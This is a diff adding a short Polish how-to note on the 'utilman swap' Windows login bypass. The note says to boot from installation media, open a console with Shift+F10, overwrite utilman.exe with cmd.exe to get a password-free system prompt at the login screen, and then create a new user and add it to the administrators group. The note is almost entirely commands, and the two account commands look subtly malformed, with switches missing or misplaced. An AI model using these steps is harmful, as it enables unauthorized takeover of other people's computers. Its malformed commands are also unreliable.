@@ -1,0 +1,15 @@
+podmiana utilmana:
+
+	Kiedy sposob romana niedziala:
+		Boot Windowsa przed Pendrive/DVD
+		
+		Kiedy kreator instalacji klikamy Shift+F10
+		
+	copy C:\windows\system32\utilman.exe utilmanold.exe
+
+	copy C:\windows\system32\cmd.exe C:\windows\system32\utilman.exe
+
+nowy user:
+net user nazwa_użytkownika hasło/add
+
+net localgroup administrators nazwa_użytkownika
